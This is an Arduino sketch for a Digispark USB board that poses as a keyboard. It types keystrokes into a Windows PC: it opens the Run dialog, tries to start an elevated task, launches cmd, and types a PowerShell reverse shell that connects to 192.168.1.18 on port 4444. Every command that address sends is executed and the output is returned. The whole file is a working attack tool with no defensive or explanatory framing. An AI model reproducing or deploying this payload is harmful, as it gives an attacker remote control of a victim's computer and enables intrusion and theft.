#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_N);//run
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("cmd");//run cmd
  DigiKeyboard.delay(2500);
  DigiKeyboard.println(F("powershell -c \""));
  DigiKeyboard.println(F("$client = New-Object System.Net.Sockets.TCPClient('192.168.1.18',4444);"));
  DigiKeyboard.println(F("$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"));
  DigiKeyboard.println(F("while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"));
  DigiKeyboard.println(F("$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"));
  DigiKeyboard.println(F("$sendback = (iex $data 2>&1 | Out-String );"));
  DigiKeyboard.println(F("$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"));
  DigiKeyboard.println(F("$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"));
  DigiKeyboard.println(F("$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"));
  DigiKeyboard.println(F("$client.Close()\"")); // Menutup string PowerShell
  DigiKeyboard.sendKeyStroke(KEY_ENTER); DigiKeyboard.delay(5000);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
